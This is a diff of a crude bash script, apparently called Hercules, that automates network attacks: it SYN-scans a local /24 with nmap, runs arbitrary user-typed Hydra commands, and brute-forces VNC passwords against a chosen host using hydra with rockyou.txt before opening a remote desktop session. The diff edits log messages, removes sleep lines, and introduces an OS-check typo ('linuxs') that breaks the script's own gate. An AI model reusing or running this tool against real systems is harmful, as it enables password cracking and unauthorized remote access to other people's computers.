@@ -6,11 +6,11 @@ CURRENT_TIME=$(date +"%I:%M:%S %p")
 # gets current date in mm/dd/yyyy formate
 CURRENT_DATE=$(date +"%m/%d/%Y")
 
-if [[ "$OSTYPE" == "linux"* ]]; then   
+if [[ "$OSTYPE" == "linuxs"* ]]; then   
     clear; #clears the terminal
     if [[ "$EUID" -ne $root  ]]; then #makes the user run this script in root user
         #if the user isnt root it says "run as root"
-        echo "ERROR:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
+        echo "ERROR:root:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
         echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
         exit; #stops the program so it does not contiue when its not suppoes to 
     else
@@ -23,7 +23,7 @@ if [[ "$OSTYPE" == "linux"* ]]; then
             echo #this is a space in the program
 
         else #if they are not connected to the internet it will say "You are offline please connect to the internet"
-            echo "ERROR:TIME:$CURRENT_TIME You are offline please connect to the internet. DATE:$CURRENT_DATE" >> ERROR.LOG
+            echo "ERROR:root:TIME:$CURRENT_TIME You are offline please connect to the internet. DATE:$CURRENT_DATE" >> ERROR.LOG
             echo "TIME:$CURRENT_TIME You are offline please connect to the internet. DATE:$CURRENT_DATE"
 
             exit #stops the program so it doesnt contiue when its not suppoes to
@@ -44,7 +44,7 @@ if [[ "$OSTYPE" == "linux"* ]]; then
             echo "Put in hydra first to start the script."; #tells the user to put Hydra first so that the program will work
             read -p ">>> " Hydra; #allows the user to hack diffrent ports that werent there before
             $Hydra;
-            exit;
+            exit
             
         else  #this part says for them only to see what prots are open
             sudo nmap -sS 192.168.1.1/24 -p $service --open
@@ -57,12 +57,7 @@ if [[ "$OSTYPE" == "linux"* ]]; then
 
             if [[ $service == 5900 ]] || [[ $service == "VNC" ]]; then #makes the user input "NONE" for them to crack prot 5900(VNC)
                 hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host #Cracks the chocien persons password for 5900(VNC)
-                echo "Loading VNC server." #tells the user that VNC(5900) is loading
-                sleep 1 # wait function 
-                echo "Loading VNC server.." #tells the user that VNC(5900) is loading
-                sleep 1 # wait function 
                 echo "Loading VNC server..." #tells the user that VNC(5900) is loading
-                sleep 1 # wait function 
                 open vnc://$host #allows the user to remotly connect to the users Desktop to play with there desktop
                 exit; # stops the porgram
 
@@ -85,6 +80,6 @@ if [[ "$OSTYPE" == "linux"* ]]; then
         Hercules; #end of the function of Hercules
 else
     clear; #clears the terminal
-    echo "WARNING:TIME:$CURRENT_TIME Wrong OS please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG #if the users is not useing the right OS it says "You are useing the wrong OS" and puts it into a error log for the user to see what went wrong with the code
+    echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG #if the users is not useing the right OS it says "You are useing the wrong OS" and puts it into a error log for the user to see what went wrong with the code
     echo "TIME:$CURRENT_TIME Wrong OS please use the correct OS. DATE:$CURRENT_DATE" #if the users is not useing the right OS it says "You are useing the wrong OS"
 fi
